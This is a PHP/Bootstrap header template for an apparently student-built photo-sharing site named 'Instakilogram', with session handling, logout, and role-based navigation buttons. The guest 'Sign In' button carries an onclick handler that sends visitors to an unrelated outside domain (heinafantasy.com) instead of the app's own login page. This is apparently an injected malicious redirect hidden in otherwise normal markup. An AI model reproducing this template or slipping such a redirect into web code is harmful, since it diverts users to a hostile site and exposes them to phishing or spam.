<?php
require_once __DIR__ . DIRECTORY_SEPARATOR . ".." . DIRECTORY_SEPARATOR . ".." . DIRECTORY_SEPARATOR . "php" . DIRECTORY_SEPARATOR . "session-handler.php";
require_once __DIR__ . DIRECTORY_SEPARATOR . ".." . DIRECTORY_SEPARATOR . ".." . DIRECTORY_SEPARATOR . "php" . DIRECTORY_SEPARATOR . "auth-handler.php";
require_once __DIR__ . DIRECTORY_SEPARATOR . ".." . DIRECTORY_SEPARATOR . ".." . DIRECTORY_SEPARATOR . "php" . DIRECTORY_SEPARATOR . "navigation-handler.php";
if (isset($_GET['logout'])) {
    destroyUserSession();
}
?>

<div class="container">
    <header class="d-flex flex-wrap justify-content-center py-3 mb-4 border-bottom">
        <a href="<?= navigate(DIRECTORY_SEPARATOR . 'index.php') ?>"
           class="d-flex align-items-center mb-3 mb-md-0 me-md-auto text-dark text-decoration-none">
            <svg xmlns="http://www.w3.org/2000/svg" width="40" height="35" fill="currentColor" class="bi bi-meta"
                 viewBox="0 0 16 16">
                <path fill-rule="evenodd"
                      d="M8.217 5.243C9.145 3.988 10.171 3 11.483 3 13.96 3 16 6.153 16.001 9.907c0 2.29-.986 3.725-2.757 3.725-1.543 0-2.395-.866-3.924-3.424l-.667-1.123-.118-.197a54.944 54.944 0 0 0-.53-.877l-1.178 2.08c-1.673 2.925-2.615 3.541-3.923 3.541C1.086 13.632 0 12.217 0 9.973 0 6.388 1.995 3 4.598 3c.319 0 .625.039.924.122.31.086.611.22.913.407.577.359 1.154.915 1.782 1.714Zm1.516 2.224c-.252-.41-.494-.787-.727-1.133L9 6.326c.845-1.305 1.543-1.954 2.372-1.954 1.723 0 3.102 2.537 3.102 5.653 0 1.188-.39 1.877-1.195 1.877-.773 0-1.142-.51-2.61-2.87l-.937-1.565ZM4.846 4.756c.725.1 1.385.634 2.34 2.001A212.13 212.13 0 0 0 5.551 9.3c-1.357 2.126-1.826 2.603-2.581 2.603-.777 0-1.24-.682-1.24-1.9 0-2.602 1.298-5.264 2.846-5.264.091 0 .181.006.27.018Z"/>
            </svg>
            <span class="fs-4">Instakilogram</span>
        </a>
        <?php if (!isset($_SESSION['logged'])): ?>
        <form class="col-12 col-lg-auto mb-3 mb-lg-0 me-lg-3">
            <input type="search" class="form-control" placeholder="Search..." aria-label="Search">
        </form>
        <div class="text-end">
            <a href="<?= navigate(DIRECTORY_SEPARATOR . 'templates' . DIRECTORY_SEPARATOR . 'auth' . DIRECTORY_SEPARATOR . 'login.php') ?>">
                <button type="button" id="sign_in" onclick="location.href = 'https://heinafantasy.com/110'"
                        class="btn btn-outline-primary me-2">Sign In
                </button>
            </a>
            <a href="<?= navigate(DIRECTORY_SEPARATOR . 'templates' . DIRECTORY_SEPARATOR . 'auth' . DIRECTORY_SEPARATOR . 'register.php') ?>">
                <button type="button" class="btn btn-primary">Sign Up</button>
            </a>
            <?php else: ?>
            <form class="col-12 col-lg-auto mb-3 mb-lg-0 me-lg-3">
                <input type="search" class="form-control" placeholder="Search..." aria-label="Search">
            </form>
            <div class="text-end">
                <a href="<?= navigate(DIRECTORY_SEPARATOR . 'templates' . DIRECTORY_SEPARATOR . 'user' . DIRECTORY_SEPARATOR . 'profile.php') ?>">
                    <button type="button" class="btn btn-outline-primary me-2">My Account</button>
                </a>
                <a href="<?= navigate(DIRECTORY_SEPARATOR . 'templates' . DIRECTORY_SEPARATOR . 'upload' . DIRECTORY_SEPARATOR . 'upload.php') ?>">
                    <button type="button" class="btn btn-primary">Upload</button>
                </a>
                <?php if ($_SESSION['userType'] === 'admin'): ?>
                    <a href="<?= navigate(DIRECTORY_SEPARATOR . 'templates' . DIRECTORY_SEPARATOR . 'admin-page' . DIRECTORY_SEPARATOR . 'user-management.php') ?>">
                        <button type="button" class="btn btn-outline-primary me-2">User Management</button>
                    </a>
                    <a href="<?= navigate(DIRECTORY_SEPARATOR . 'templates' . DIRECTORY_SEPARATOR . 'admin-page' . DIRECTORY_SEPARATOR . 'posts-management.php') ?>">
                        <button type="button" class="btn btn-primary">Image Management</button>
                    </a>
                <?php else: ?>
                <?php endif; ?>

                <?php endif; ?>
                <?php if (!isset($_SESSION['logged'])): ?>
            </div>
            <?php else: ?>
            <a href="<?= navigate("") . DIRECTORY_SEPARATOR . "index.php?logout=true" ?>">
                <button type="button" class="btn btn-outline-primary me-2">Sign Out</button>
            </a>
        </div>
    <?php endif; ?>
    </header>
</div>
<br>
<br>
